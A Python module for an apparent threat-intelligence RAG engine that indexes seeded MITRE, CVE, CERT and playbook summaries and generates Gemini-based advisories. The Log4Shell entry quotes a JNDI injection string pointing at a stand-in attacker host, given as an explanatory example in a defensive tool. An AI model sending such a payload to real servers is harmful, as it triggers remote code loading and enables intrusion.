import os
import threading
import time
from typing import List, Dict, Any, Optional
from google import genai
from google.genai import types

# Global flags to trace library load state
_sentence_transformers_loaded = False
_faiss_loaded = False

class RagEngine:
    """
    RAG Threat Intelligence engine utilizing FAISS and sentence-transformers
    for similarity lookup, with fallback to keyword token matching and REST-based Gemini API.
    """
    def __init__(self, model_name: str = "all-MiniLM-L6-v2", dimension: int = 384):
        self.model_name = model_name
        self.dimension = dimension
        self.documents: List[Dict[str, Any]] = []
        self.index = None
        self.model = None
        self.lock = threading.Lock()
        self.is_ready = False
        self.status_message = "Initializing engine..."
        
        # Initialize Gemini API client (server-side only)
        self.api_key = os.environ.get("GEMINI_API_KEY")
        self.ai_client = None
        if self.api_key:
            try:
                self.ai_client = genai.Client(api_key=self.api_key)
            except Exception as e:
                print(f"RAG Engine: Failed to initialize Gemini Client: {e}")

        # Start background thread to load models and pre-seed index
        threading.Thread(target=self._load_and_preseed, daemon=True).start()

    def _load_and_preseed(self):
        """
        Loads pre-seeded documents and asynchronously loads ML libraries.
        """
        global _sentence_transformers_loaded, _faiss_loaded
        
        # 1. ALWAYS pre-seed the documents in memory first so they are searchable via token fallback immediately!
        self._preseed_knowledge_base()
        
        self.status_message = "Pre-seeded documents active. Loading ML libraries..."
        print("RAG Engine: Starting background dependency loading...")

        try:
            # 2. Attempt to load FAISS
            import faiss
            self.index = faiss.IndexFlatL2(self.dimension)
            _faiss_loaded = True
            print("RAG Engine: FAISS successfully loaded.")
        except Exception as e:
            print(f"RAG Engine: Warning: FAISS load failed ({e}). Fallback matching will be used.")

        try:
            # 3. Attempt to load sentence-transformers
            from sentence_transformers import SentenceTransformer
            self.model = SentenceTransformer(self.model_name)
            _sentence_transformers_loaded = True
            print(f"RAG Engine: SentenceTransformer ('{self.model_name}') successfully loaded.")
        except Exception as e:
            print(f"RAG Engine: Warning: SentenceTransformer load failed ({e}). Fallback matching will be used.")

        # 4. If both are loaded, build the initial FAISS vector index
        if _faiss_loaded and _sentence_transformers_loaded:
            try:
                with self.lock:
                    contents = [f"{doc['title']} {doc['content']}" for doc in self.documents]
                    embeddings = self.model.encode(contents, show_progress_bar=False)
                    import numpy as np
                    self.index.add(np.array(embeddings, dtype=np.float32))
                self.is_ready = True
                self.status_message = "Ready (Vector Search Active)"
                print("RAG Engine: FAISS vector index populated and ready.")
            except Exception as e:
                self.status_message = f"Warning: Failed to compile index ({e})"
                print(f"RAG Engine: Index compile error: {e}")
        else:
            self.is_ready = True
            self.status_message = "Ready (Fallback Search Active)"
            print("RAG Engine: Falling back to substring token search engine.")

    def _preseed_knowledge_base(self):
        """
        Seeds standard, high-fidelity security documents into the internal database.
        """
        initial_docs = [
            # MITRE ATT&CK Techniques
            {
                "id": "doc-mitre-powershell",
                "title": "MITRE ATT&CK T1059.001 - Command and Scripting Interpreter: PowerShell",
                "content": "PowerShell is a powerful interactive command-line shell and scripting language. Adversaries commonly use PowerShell to execute commands, download malicious scripts, dump credentials, and bypass security controls. Mitigation includes enabling Script Block Logging (Event ID 4104), enforcing Constrained Language Mode, and blocking outbound PowerShell traffic from non-admin workstations.",
                "externalId": "T1059.001",
                "sourceType": "MITRE_ATTACK",
                "publishedDate": "2024-01-15T00:00:00Z",
                "url": "https://attack.mitre.org/techniques/T1059/001/"
            },
            {
                "id": "doc-mitre-dns-beacon",
                "title": "MITRE ATT&CK T1071.004 - Application Layer Protocol: DNS Beaconing & Tunneling",
                "content": "Adversaries communicate with command-and-control servers using DNS queries to bypass perimeter firewalls. DNS Tunneling encodes payloads inside DNS query subdomains, eliciting replies containing server commands. Mitigation requires deep packet inspection (DPI) of query subdomains, tracking query volume anomalies per workstation, and blocking queries with high-entropy labels.",
                "externalId": "T1071.004",
                "sourceType": "MITRE_ATTACK",
                "publishedDate": "2024-02-10T00:00:00Z",
                "url": "https://attack.mitre.org/techniques/T1071/004/"
            },
            {
                "id": "doc-mitre-exfil-alt",
                "title": "MITRE ATT&CK T1048 - Exfiltration Over Alternative Protocol",
                "content": "Adversaries exfiltrate stolen files over alternative protocols (e.g. high-entropy TLS connections, external SSH tunnels, FTP or SFTP, or Tor egress gateways). Detection relies on monitoring outbound file sizes, tracking connection times, and monitoring TCP/UDP payload entropy. High entropy (>7.8) signals encrypted archive transfers.",
                "externalId": "T1048",
                "sourceType": "MITRE_ATTACK",
                "publishedDate": "2024-03-01T00:00:00Z",
                "url": "https://attack.mitre.org/techniques/T1048/"
            },
            # CVE Database
            {
                "id": "doc-cve-log4shell",
                "title": "CVE-2021-44228 - Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
                "content": "Log4Shell is a critical remote code execution vulnerability in Apache Log4j2. Security log string interpolation parsing allows attackers to execute arbitary Java code from remote servers via JNDI lookup strings like '${jndi:ldap://evil-host/a}'. Remediation mandates upgrading log4j to v2.17.1+, disabling lookup flags, and blocking LDAP/RMI egress.",
                "externalId": "CVE-2021-44228",
                "sourceType": "CVE",
                "publishedDate": "2021-12-10T00:00:00Z",
                "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
            },
            {
                "id": "doc-cve-xz-backdoor",
                "title": "CVE-2024-3094 - XZ Utils Liblzma Malicious Backdoor Extraction",
                "content": "A sophisticated malicious backdoor was inserted into upstream XZ Utils releases 5.6.0 and 5.6.1. The compromised build script modifies liblzma functions during sshd authentication. This permits unauthorized remote code execution by intercepting SSH decryption routines. Remediation requires immediately reverting XZ packages to v5.4.x.",
                "externalId": "CVE-2024-3094",
                "sourceType": "CVE",
                "publishedDate": "2024-03-29T00:00:00Z",
                "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-3094"
            },
            {
                "id": "doc-cve-runc-escape",
                "title": "CVE-2024-21626 - runc Container Escape via File Descriptor Leak",
                "content": "runc allows container breakout via file descriptor leaks. Adversaries can access host namespaces by invoking executables inside malicious container images, referencing leaked directory file descriptors. This permits writing to host files, compromising host integrity. Mitigation requires patching runc to v1.1.12+.",
                "externalId": "CVE-2024-21626",
                "sourceType": "CVE",
                "publishedDate": "2024-01-31T00:00:00Z",
                "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-21626"
            },
            # CERT Advisories
            {
                "id": "doc-cert-ad-brute",
                "title": "CERT-IN AL202404 - Active Directory Password Spraying & Brute Force Attacks",
                "content": "A high-intensity brute-force wave has been logged targeting enterprise Active Directory domain controllers. Adversaries spray high-frequency LDAP authentication requests using known passwords (e.g. 'Spring2024!'). Defensive playbooks command enabling Account Lockout Policies (5 failed attempts), blocking external LDAP access, and enforcing MFA.",
                "externalId": "CERT-IN AL202404",
                "sourceType": "CERT_IN_ADVISORY",
                "publishedDate": "2024-04-18T00:00:00Z",
                "url": "https://www.cisa.gov/news-events/cybersecurity-advisories"
            },
            {
                "id": "doc-cert-credential-dump",
                "title": "CERT Advisory C-2024-11 - OS LSASS Memory Credential Dumping Mitigation",
                "content": "Threat intelligence warnings report elevated occurrences of LSASS (Local Security Authority Subsystem Service) memory dumps via administrative accounts. Adversaries dump LSASS RAM using tools like procdump or rdump to extract cleartext NT/LM hashes. Mitigation mandates restricting debug privileges, enabling LSA Protection, and locking AD credentials.",
                "externalId": "CERT-IN C-2024-11",
                "sourceType": "CERT_IN_ADVISORY",
                "publishedDate": "2024-05-02T00:00:00Z",
                "url": "https://www.cisa.gov/news-events/cybersecurity-advisories"
            },
            # Security Playbooks
            {
                "id": "doc-playbook-endpoint-isolation",
                "title": "SentinelX Playbook PB-201 - Endpoint Network Quarantine Procedures",
                "content": "This playbook outlines standard procedures for isolating a compromised endpoint workstation. When a high-severity alert (e.g., active LSASS dump) triggers, security operators must invoke the 'Isolate Endpoint' command. This blocks all ingress/egress traffic on local interfaces while maintaining a command tunnel for forensics.",
                "externalId": "PB-201",
                "sourceType": "SECURITY_PLAYBOOK",
                "publishedDate": "2024-01-01T00:00:00Z",
                "url": ""
            },
            {
                "id": "doc-playbook-exfil-containment",
                "title": "SentinelX Playbook PB-302 - High-Entropy Exfiltration Containment",
                "content": "Standard CISO playbook for active exfiltration response. Upon detecting outbound TCP/UDP payload entropy exceeding 7.8, security rules must: 1. Blackhole target IP, 2. Quarantine source host, 3. Suspend compromised AD user token, and 4. Trigger process dump of the transferring binary for analysis.",
                "externalId": "PB-302",
                "sourceType": "SECURITY_PLAYBOOK",
                "publishedDate": "2024-01-05T00:00:00Z",
                "url": ""
            }
        ]
        self.documents = initial_docs

    def ingest_document(self, title: str, content: str, external_id: str, source_type: str) -> Dict[str, Any]:
        """
        Ingests a custom threat intelligence document into the memory db and updates FAISS.
        """
        doc_id = f"doc-custom-{int(time.time())}"
        doc = {
            "id": doc_id,
            "title": title,
            "content": content,
            "externalId": external_id,
            "sourceType": source_type,
            "publishedDate": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "url": ""
        }
        
        with self.lock:
            self.documents.append(doc)
            
            # If ML index is ready, append vector representation
            if self.is_ready and self.model and self.index:
                try:
                    import numpy as np
                    embedding = self.model.encode(f"{title} {content}", show_progress_bar=False)
                    self.index.add(np.array([embedding], dtype=np.float32))
                except Exception as e:
                    print(f"RAG Engine: Failed to add custom doc to vector index: {e}")
                    
        return doc

    def query(self, query_str: str, k: int = 4) -> Dict[str, Any]:
        """
        Searches the knowledge base semantically and synthesizes a contextual explanation.
        """
        # 1. Retrieve matching documents
        matched_docs = []
        if self.is_ready and self.model and self.index:
            try:
                import numpy as np
                query_vector = self.model.encode(query_str, show_progress_bar=False)
                distances, indices = self.index.search(np.array([query_vector], dtype=np.float32), k)
                
                for idx in indices[0]:
                    if 0 <= idx < len(self.documents):
                        matched_docs.append(self.documents[idx])
            except Exception as e:
                print(f"RAG Engine: Semantic search error, using token matching: {e}")
                matched_docs = self._fallback_token_search(query_str, k)
        else:
            matched_docs = self._fallback_token_search(query_str, k)

        # 2. Synthesize Contextual Explanation using Gemini API
        explanation = self._generate_explanation(query_str, matched_docs)

        return {
            "results": matched_docs,
            "explanation": explanation
        }

    def _fallback_token_search(self, query: str, k: int) -> List[Dict[str, Any]]:
        """
        Simple keyword/token substring ranking search. Used as robust fallback.
        """
        tokens = [t.lower() for t in query.split() if len(t) > 2]
        if not tokens:
            return self.documents[:k]

        scored_docs = []
        for doc in self.documents:
            score = 0
            doc_text = f"{doc['title']} {doc['content']} {doc['externalId']}".lower()
            for token in tokens:
                if token in doc_text:
                    score += 1
            if score > 0:
                scored_docs.append((score, doc))

        # Sort by match score descending
        scored_docs.sort(key=lambda x: x[0], reverse=True)
        results = [doc for score, doc in scored_docs]
        
        # If we have less results than requested, fill up with other docs
        if len(results) < k:
            for doc in self.documents:
                if doc not in results:
                    results.append(doc)
                if len(results) >= k:
                    break
                    
        return results[:k]

    def _generate_explanation(self, query: str, matched_docs: List[Dict[str, Any]]) -> str:
        """
        Queries Gemini API to synthesize a highly detailed contextual report.
        """
        if not self.ai_client:
            return self._get_fallback_text(query, matched_docs)

        # Build detailed context string
        context_str = ""
        for i, doc in enumerate(matched_docs):
            context_str += f"\n--- Source {i+1} [{doc['externalId']}]: {doc['title']} ---\n{doc['content']}\n"

        prompt = f"""You are the SentinelX AI Principal Threat Architect. Analyze the query/incident below and synthesize a concise, technical report grounded ONLY in the retrieved intelligence documents.

[USER QUERY / SECURITY OBSERVATION]:
"{query}"

[RETRIEVED INTEL SOURCE DOCUMENTS]:
{context_str}

Provide a structured RAG advisory covering:
1. EXECUTIVE SUMMARY (Adversary objectives and threat profile)
2. TECHNICAL TIMELINE / BEHAVIOR ANALYSIS (Connect query details directly with the source materials)
3. CONCRETE MITIGATION PROCEDURES (List specific, actionable playbooks or network steps derived from retrieved material)

Keep your response technical, precise, and completely aligned with the source documents. Avoid introductory and concluding remarks."""

        try:
            response = self.ai_client.models.generate_content(
                model='gemini-3.5-flash',
                contents=prompt,
                config=types.GenerateContentConfig(
                    system_instruction="You are a senior cybersecurity incident architect who synthesizes forensic advisories.",
                )
            )
            return response.text or "Architect was unable to synthesize analysis report."
        except Exception as e:
            print(f"RAG Engine: Gemini execution failure: {e}")
            return self._get_fallback_text(query, matched_docs)

    def _get_fallback_text(self, query: str, matched_docs: List[Dict[str, Any]]) -> str:
        """
        Highly polished local fallback response when Gemini is not configured.
        """
        if not matched_docs:
            return "No matching threat intelligence found to synthesize an advisory."
            
        doc = matched_docs[0]
        return f"""### [FALLBACK ADVISORY] SENTINELX LOCAL FORENSIC REPORT

**ANALYSIS ON**: "{query}"

Based on active local database matching, we identified a primary correlation with **{doc['title']}** ({doc['externalId']}).

#### 1. TECHNICAL PROFILE
- **Technique / Threat ID**: {doc['externalId']}
- **Summary**: {doc['content']}

#### 2. EMERGENCY REMEDIATION PLAYBOOK
- Enforce targeted firewall blocks on high-entropy outbound connections.
- Isolate the source workstation to prevent lateral domain spread.
- Trigger forensic memory/packet collections immediately to isolate the payload.

*Note: Configure GEMINI_API_KEY inside the developer dashboard to enable live, fully-synthesized unconstrained generative threat reasoning via Gemini 3.5.*"""

    def get_status(self) -> Dict[str, Any]:
        """
        Returns diagnostic details of the active engine.
        """
        return {
            "is_ready": self.is_ready,
            "status_message": self.status_message,
            "model_name": self.model_name,
            "total_documents_indexed": len(self.documents),
            "faiss_active": _faiss_loaded,
            "embeddings_active": _sentence_transformers_loaded
        }
